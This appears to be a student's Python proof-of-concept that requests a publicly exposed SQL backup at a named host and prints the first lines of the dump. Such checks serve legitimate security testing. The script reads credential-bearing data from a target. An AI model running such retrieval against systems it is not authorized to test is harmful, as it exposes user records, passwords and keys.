#  Author: Ifrad Hossain 101587843
#  Vulnerability: Exposed Database Backup (SQL Dump)
#  Target: files.0x10.cloud
'''
This script checks for exposed database backups in the files.0x10.cloud directory.
It attempts to read an exposed SQL database dump. Leaving backup files in a publicly accessible 
web directory is a critical security risk. 
It exposes all user credentials, API keys, and the entire database architecture to attackers.
'''

import urllib.request
import urllib.error
import time

target_url = "https://files.0x10.cloud/backup/db_dump_20240301.sql"
print("=" * 50)
print("Exposed Database Backups")
print("=" * 50)
print(f"\n  Target: {target_url}")
print("  Scanning...")

time.sleep(0.15)

try:
    req = urllib.request.Request(target_url, headers={'Range': 'bytes=0-1024'})
    response = urllib.request.urlopen(req, timeout=5)
    
    if response.status == 200 or response.status == 206:
        content = response.read(1024).decode('utf-8', errors='ignore')
        
        print("CRITICAL VULNERABILITY FOUND")
        print("Successfully accessed database backup: " + "db_dump_20240301.sql")
        print("Security Risk: An entire database dump is publicly downloadable.")
        print("This exposes ALL user records, passwords, and sensitive config keys (like AWS and API keys).")
        print("\n  --- File Snippet ---")
        
        lines = content.split('\n')
        amount_to_show = 8
        for index, line in enumerate(lines):
            if index < amount_to_show and len(line.strip()) > 0:
                print("  " + line.strip())
        print("  ... (truncated for security) ...")

except urllib.error.HTTPError as e:
    # If the server properly blocks access
    print(f"\n  [OK] Server denied access or file not found. HTTP Status: {e.code}")
except Exception as e:
    # Catching general connection or socket errors
    print(f"\n  [ERROR] Could not connect or retrieve data: {e}")

print("\n" + "=" * 50)